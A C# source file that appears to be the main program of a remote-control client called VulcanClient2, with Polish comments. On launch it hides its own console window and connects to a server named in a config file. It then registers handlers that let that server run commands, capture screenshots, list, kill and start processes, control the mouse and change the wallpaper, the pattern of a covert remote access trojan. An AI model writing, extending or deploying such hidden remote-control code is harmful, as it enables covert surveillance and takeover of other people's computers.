using System;
using System.Diagnostics;
using System.IO;
using SocketIOClient;
using System.Text;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using OpenQA.Selenium;
using System.Collections.Generic;
using System.Linq;
using System.ComponentModel;
using Microsoft.Extensions.Configuration;
using System.Runtime.InteropServices;
using System.Threading;
using Serilog;
using Serilog.Events;

using VulcanClient2.Events;
using VulcanClient2.Webdriver;
using VulcanClient2.Webdriver.Actions;

namespace VulcanClient2
{
    class Program
    {
        
        public static Uri SocketUri { get; set; }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static async Task Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Chowamy okno konsoli
            ShowWindow(handle, SW_HIDE);

            Log.Logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .MinimumLevel.Override("Microsoft", LogEventLevel.Warning)
                .Enrich.FromLogContext()
                .WriteTo.File(Directory.GetCurrentDirectory() + "/logs/LogFile.txt")
                .CreateLogger();
            try
            {
                Log.Information("Vulcan Client v.1.0.4");
                var builder = new ConfigurationBuilder()
                    .SetBasePath(Directory.GetCurrentDirectory())
                    .AddJsonFile("config.json");
                
                var config = builder.Build();
                var adress = config.GetSection("Adress").Value;

                SocketUri = new Uri(adress + "clients");
                var socket = new SocketIO(SocketUri);
                var notification = new Notification(socket);
                
                socket.OnConnected += Socket_OnConnected;
                socket.OnDisconnected += Socket_onDisconnected;
                
                // Dodajemy eventy
                var eventManager = new EventManager();
                
                eventManager.Add( new CommandEvent(socket, "command"));
                eventManager.Add(new WebsiteEvent(socket, "website", notification));
                eventManager.Add(new ScreenShootEvent(socket, "screenshot"));
                eventManager.Add(new ProcessListEvent(socket, "process_list"));
                eventManager.Add(new ProcessKillEvent(socket, "process_kill", notification));
                eventManager.Add(new ProcessStartEvent(socket, "process_start", notification));
                eventManager.Add(new MouseEvent(socket, "mouse"));
                eventManager.Add(new MouseClickEvent(socket, "mouse_click"));
                eventManager.Add(new WallPaperEvent(socket, "wallper"));
                
                
                socket.OnReceivedEvent += (sender,  e) =>
                {
                    var events = eventManager.GetAll();
                    IEvent ev = events.Find(evv => evv.Name == e.Event);
                    if (ev != null)
                    {
                        if (e.Event == ev.Name)
                        {
                            ev.Run(e.Response);
                        }
                    }
                };

                try
                {
                    await socket.ConnectAsync();
                }
                catch (System.Net.WebSockets.WebSocketException e)
                {
                    Log.Fatal(e, "Nie mozna bylo sie polaczyc z serwerem");
                    Log.Debug("Lacze ponownie");
                }

                Console.ReadLine();
            }
            catch (Exception e)
            {
                Log.Fatal(e, "Wystapil problem z aplikacja");
            }
            finally
            {
                Log.CloseAndFlush();
            }
        }
        private static void Socket_OnConnected(object sender, EventArgs e)
        {
            var socket = sender as SocketIO;
            Log.Debug("Klient polaczony " + socket.Id);
        }

        private static void Socket_onDisconnected(object sender, string e)
        {
            Log.Debug("Klient rozlaczony");
        }
    }
}